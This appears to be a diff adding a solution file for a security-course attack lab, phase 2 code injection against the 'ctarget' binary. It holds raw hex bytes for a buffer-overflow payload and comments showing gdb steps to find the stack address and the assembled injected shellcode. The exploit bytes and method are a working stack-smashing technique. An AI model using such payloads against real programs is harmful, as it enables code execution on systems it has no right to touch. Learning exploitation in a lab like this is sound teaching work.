@@ -1,0 +1,40 @@
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+
+/*
+    First you should know the stack starting address is fixed, Got it by GDB
+        unix> gdb ctarget
+        (gdb) break getbuf
+        (gdb) r -q
+        (gdb) p/x $rip
+        $1 = 0x4017ac
+        (gdb) p/x $rsp
+        $2 = 0x5561dc78
+
+
+    You should jump to the following Injected Code by ret instruction
+    And set the Injected Code contained by the buffer
+    
+    Injected Code:
+        mov     $0x59b997fa,%rdi
+        push    $0x4017ec
+        ret
+
+    unix> gcc -c Injected-Code
+    unix> objdump -d Injected-Code.o > Injected-Code.d
+
+    Injected-Code.d contains:
+
+        Injected-Code.d     file format elf64-x86-64
+        Disassembly of section .text:
+
+        0000000000000000 <.text>:
+        0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+        7:	68 ec 17 40 00       	pushq  $0x4017ec
+        c:	c3                   	retq 
+
+*/
